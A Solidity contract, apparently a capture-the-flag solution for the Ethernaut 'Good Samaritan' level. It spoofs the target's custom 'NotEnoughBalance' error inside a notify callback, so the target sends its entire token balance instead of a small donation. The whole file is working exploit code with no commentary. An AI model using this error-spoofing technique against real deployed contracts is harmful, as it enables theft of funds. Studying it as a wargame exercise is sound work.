// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";
contract SamaritanHack is INotifyable{
    error NotEnoughBalance();
    function notify(uint256 amount) external {
        if(amount == 10){
            revert NotEnoughBalance();
        } 
    }

    function requestDonation(address instance) external {
        GoodSamaritan sm = GoodSamaritan(instance);
        sm.requestDonation();
    }
}